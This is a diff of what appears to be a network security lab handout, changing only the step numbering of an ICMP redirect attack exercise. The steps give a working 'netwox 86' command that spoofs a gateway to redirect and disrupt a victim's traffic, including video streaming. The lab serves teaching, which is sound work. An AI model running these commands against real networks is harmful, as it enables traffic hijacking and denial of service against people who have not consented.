@@ -37,19 +37,19 @@ question: can you find out what "--code 1" means?
 
 ### Attack steps:
 
-step 1. victim, run: $ ping www.google.com
+1. victim, run: $ ping www.google.com
 make sure you ping command works and you do get response from google, otherwise this lab makes no sense.
 if ping works, press ctrl-c to stop the ping command and move on to step 2.
 
-step 2. attacker, run that attack command: $ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1
-step 3. victim, run: $ ping www.google.com (this time it should still succeed)
-step 4: attacker, press ctrl-c to stop the attack command.
-step 5: victim, run: $ ping www.google.com (this time it should fail, thus it proves the attack is successful.)
+2. attacker, run that attack command: $ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1
+3. victim, run: $ ping www.google.com (this time it should still succeed)
+4: attacker, press ctrl-c to stop the attack command.
+5: victim, run: $ ping www.google.com (this time it should fail, thus it proves the attack is successful.)
 
-step 6: attacker, run: $ sudo sysctl net.ipv4.ip_forward=1 (immediately the victim's ping will then succeed, explain why?)
-step 7: attacker, run: $ sudo sysctl net.ipv4.ip_forward=0 (turning this off so our attack will succeed.)
+6: attacker, run: $ sudo sysctl net.ipv4.ip_forward=1 (immediately the victim's ping will then succeed, explain why?)
+7: attacker, run: $ sudo sysctl net.ipv4.ip_forward=0 (turning this off so our attack will succeed.)
 
 the next two steps attempt a new attack which disrupts the victim's video streaming service:
 
-step 8: victim, open firefox, watch some youtube video.
-step 9: attacker, run the exact same attack command as before: $ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1 (if successful, victim won't be able to watch the youtude video)
+8: victim, open firefox, watch some youtube video.
+9: attacker, run the exact same attack command as before: $ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1 (if successful, victim won't be able to watch the youtude video)
